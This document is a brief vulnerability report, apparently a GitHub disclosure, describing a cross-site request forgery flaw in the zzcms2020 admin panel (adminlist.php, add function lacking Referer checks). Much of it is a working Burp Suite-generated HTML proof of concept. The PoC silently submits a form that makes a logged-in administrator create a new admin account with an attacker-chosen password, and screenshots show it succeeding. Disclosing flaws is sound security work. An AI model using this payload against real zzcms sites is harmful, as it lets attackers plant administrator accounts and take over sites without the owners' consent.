
* version: zzcms2020
* source: http://www.zzcms.net/about/6.htm
* issue: csrf

## Position

in `zzcms2020/admin/adminlist.php line 129`：



The `function add()` dosen't check the  Referer header.

![zzcms2020_csrf_1](https://github.com/779789571/zzcms/blob/main/zzcms2020_csrf_1.png)



## PoC
generate a csrf Poc by burpsuite.

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://zzcms.com/admin/adminlist.php?do=add" method="POST">
      <input type="hidden" name="groupid" value="1" />
      <input type="hidden" name="admins" value="admin1234" />
      <input type="hidden" name="passs" value="admin123" />
      <input type="hidden" name="passs2" value="admin123" />
      <input type="hidden" name="Submit" value="æ&#143;&#144;äº&#164;" />
      <input type="hidden" name="action" value="add" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
if the admin click the button,the attack will trigger and add a admin account named admin1234.

![zzcms2020_csrf_2](https://github.com/779789571/zzcms/blob/main/zzcms2020_csrf_5.png)

triggered.
![zzcms2020_csrf_2](https://github.com/779789571/zzcms/blob/main/zzcms2020_csrf_2.png)


